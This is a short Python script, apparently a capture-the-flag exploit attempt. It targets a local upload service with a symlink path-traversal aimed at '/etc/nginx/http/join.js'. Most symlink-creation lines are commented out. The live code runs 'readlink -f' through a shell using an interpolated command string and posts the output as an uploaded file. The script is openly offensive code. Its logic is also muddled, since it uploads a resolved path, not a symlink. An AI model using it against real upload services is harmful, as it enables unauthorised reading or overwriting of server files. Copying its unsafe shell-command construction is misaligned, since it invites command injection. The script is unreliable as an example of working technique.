import os
import requests
import subprocess

# Variables
symlink_path = "link"
target_path = "../../../../../etc/nginx/http/join.js"
upload_url = "http://localhost:1024/upload"

# Create a symbolic link
#os.symlink(target_path, symlink_path)


# Read the symlink itself (not the target)
#symlink_info = os.readlink(symlink_path)

# Upload symlink info as text (or you could use a custom file structure)
#response = requests.post(upload_url, data={'symlink_path': symlink_path, 'target_path': symlink_info})
#print(response.text)

# Ensure the symlink exists
#if not os.path.exists(symlink_path):
    #os.symlink(target_path, symlink_path)

# Use a system command to get the raw binary data of the symlink
# `readlink` command is used here to fetch the target of the symlink
command = f"readlink -f {symlink_path}"
process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
symlink_bytes, _ = process.communicate()

# Upload the binary data
files = {'file': ('symlink', symlink_bytes, 'application/octet-stream')}
response = requests.post(upload_url, files=files)
print("Status Code:", response.status_code)
print("Response Body:", response.text)
